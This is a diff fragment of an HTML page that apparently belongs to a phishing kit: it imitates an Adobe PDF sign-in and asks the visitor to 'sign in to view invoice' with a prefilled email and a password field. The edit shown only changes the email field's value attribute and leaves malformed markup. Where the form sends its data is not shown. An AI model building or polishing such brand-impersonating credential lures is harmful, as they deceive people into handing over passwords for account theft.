@@ -18,7 +18,7 @@ div .sign-opt {	padding: 20px 0px;	font-size: 14px;}
 <DIV id=logo><IMG border=0 alt="" src="https://static.adobelogin.com/clients/virgoweb-2020/4x_817cf14a2f3fcff4ee6d4e35c5026779.png" color="#b30b00" align="top" width="30" height="30"/> <b> Adobe PDF</b></DIV></p><p>
 <DIV id=cont style="TEXT-ALIGN: left; PADDING-TOP: 10px; font-size:20px; color:#b30b00;" >Sign in to view invoice</DIV></p><p>
 
-<DIV><INPUT  name=login required="required" value="Email" placeholder="Email address" readonly style="width:320; height:30; border-color: #b30b00"></DIV></p>
+<DIV><INPUT  name=login required="required" value=Email" placeholder="Email address" readonly style="width:320; height:30; border-color: #b30b00"></DIV></p>
 <DIV><INPUT type=password name=passwd required="required" autofocus="autofocus" placeholder="Password" style="width:320; height:30; border-color: #b30b00"></DIV>
 <DIV id=sign-opt class=sign-opt>
 <DIV id=no-acc></A></DIV>
